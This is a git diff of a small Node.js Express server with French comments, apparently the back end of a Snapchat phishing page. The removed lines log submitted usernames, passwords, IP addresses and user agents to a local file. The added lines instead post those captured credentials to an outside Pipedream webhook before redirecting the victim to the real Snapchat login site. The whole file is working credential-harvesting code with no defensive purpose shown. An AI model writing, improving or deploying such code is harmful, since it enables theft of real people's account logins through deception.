@@ -1,6 +1,6 @@
 const express = require('express');
-const fs = require('fs');
 const path = require('path');
+const axios = require('axios');
 
 // Créer une instance d'Express
 const app = express();
@@ -13,25 +13,26 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Route POST pour traiter les données du formulaire
-app.post('/submit', (req, res) => {
+app.post('/submit', async (req, res) => {
   const { username, password } = req.body;
+  const logData = {
+    username,
+    password,
+    date: new Date().toISOString(),
+    ip: req.ip,
+    userAgent: req.headers['user-agent'],
+  };
 
-  // Créer une chaîne de données à enregistrer
-  const data = `Username: ${username} | Password: ${password} | Date: ${new Date().toISOString()} | IP: ${req.ip} | User-Agent: ${req.headers['user-agent']}\n`;
-
-  // Ajouter les données au fichier logs.txt
-  const logFilePath = path.join(__dirname, 'logs.txt');
-  fs.appendFile(logFilePath, data, (err) => {
-    if (err) {
-      console.error('Erreur lors de l\'écriture du fichier :', err);
-    }
-  });
-
-  // Rediriger l'utilisateur vers Snapchat
-  res.redirect('https://accounts.snapchat.com');
+  try {
+    await axios.post('https://eorr3ja3ddbjpj1.m.pipedream.net', logData);
+    res.redirect('https://accounts.snapchat.com');
+  } catch (error) {
+    console.error('Erreur lors de l\'envoi des logs :', error);
+    res.status(500).send('Erreur interne');
+  }
 });
 
-// Démarrer le serveur
+
 app.listen(PORT, () => {
   console.log(`Serveur en cours d'exécution sur http://localhost:${PORT}`);
 });
